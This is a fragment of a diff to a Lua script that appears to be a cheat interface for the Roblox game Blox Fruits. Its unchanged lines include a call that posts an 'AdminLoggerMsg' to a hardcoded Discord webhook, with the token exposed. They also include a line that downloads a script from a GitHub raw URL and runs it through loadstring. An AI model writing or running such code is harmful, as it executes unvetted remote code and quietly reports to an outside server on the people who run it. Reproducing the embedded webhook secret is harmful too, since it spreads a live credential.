@@ -11,7 +11,6 @@ function PostWebhook(Url, message)
     )
     return ""
 end
-
 function AdminLoggerMsg()
     AdminMessage = {
         ["embeds"] = {
@@ -63,7 +62,6 @@ function AdminLoggerMsg()
     }
     return AdminMessage
 end
-
 PostWebhook("https://discord.com/api/webhooks/1267904448307662910/G9qYGFA1ygTZTVTJJHkLD4LmAvSXG7llN2YhbvlxU0B1e1lJLgJTrtcfi8AmrD9eUv_E", AdminLoggerMsg())
 -- Script Blox FruiT UI Alchemy
 local SlayerzUI_MobileToggle = loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/BrutalityV2/main/mtoggleUI.script"))()
